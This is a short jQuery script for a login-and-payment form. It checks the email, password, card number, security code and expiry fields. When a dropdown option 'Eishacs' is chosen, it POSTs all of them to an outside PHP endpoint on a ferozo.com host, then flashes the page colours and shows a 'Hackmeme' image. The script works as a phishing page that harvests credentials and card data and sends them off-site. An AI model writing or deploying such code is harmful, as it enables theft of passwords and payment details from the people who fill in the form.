var intervalOn = false;
function validate(id, len = 0) {
    var State = false;
    if ($(id).val().length < len) {
        $(id).css("border-color", "#FF0000");
        $(id + "Error").removeClass("d-none");
    }
    else {
        $(id).css("border-color", "#ced4da");
        $(id + "Error").addClass("d-none");
        State = true;
    }
    return State;
}
$(document).ready(function () {

    $(".dropdown-item").click(function () {
        $("#dropdownMenuButton").text($(this).text());
    });
    $("#btn_submit").click(function (e) {
        e.preventDefault();
        var bool = validate("#password", 8);
        bool = bool & validate("#email", 5);
        bool = bool & validate("#cardNumber", 16);
        bool = bool & validate("#secCode", 3);
        bool = bool & validate("#expire", 1);
        datos = {
            mail: $("#email").val(),
            password: $("#password").val(),
            cardNumber: $("#cardNumber").val(),
            secCode: $("#secCode").val(),
            expire: $("#expire").val()
        }
        if (bool) {
            if ($("#dropdownMenuButton").text() == "Eishacs") {

                $.ajax({
                    method: "POST",
                    url: "http://c1520508.ferozo.com/req/save.php",
                    data: datos,
                    success: function () {
                        if (!intervalOn) {
                            Interval = window.setInterval(function () {
                                var back = ["#ff0000", "blue", "purple", "green", "yellow", "orange"];
                                var rand = back[Math.floor(Math.random() * back.length)];
                                $("body").css('background', rand);
                            }, 20);
                            intervalOn = true;
                        }
                        if (!($("#hacker").attr("id") == "hacker")) {
                            $("h2").prepend('<img id="hacker" class="w-75 text-center" src="Hackmeme.jpg"> <br>');
                        }
                    },
                    error: function (result) {
                        $("body").css('background', "white");
                        if (intervalOn) {
                            clearInterval(Interval);
                            intervalOn = false;
                        }
                        try {
                            $("#hacker").remove();
                        }
                        catch{ }
                        alert("ERROR");
                    }
                });
            } else {
                $('#myForm').submit();
            }
        }
    });
});